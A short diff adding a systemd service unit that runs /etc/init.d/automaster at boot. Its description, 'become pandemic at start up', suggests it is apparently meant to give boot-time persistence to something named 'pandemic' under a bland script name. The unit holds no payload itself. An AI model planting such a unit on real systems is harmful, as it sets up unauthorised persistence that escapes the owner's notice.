@@ -1,0 +1,10 @@
+[Unit]
+Description = become pandemic at start up
+
+[Service]
+ExecStart = /etc/init.d/automaster
+Restart = no
+Type = simple
+
+[Install]
+WantedBy = multi-user.target
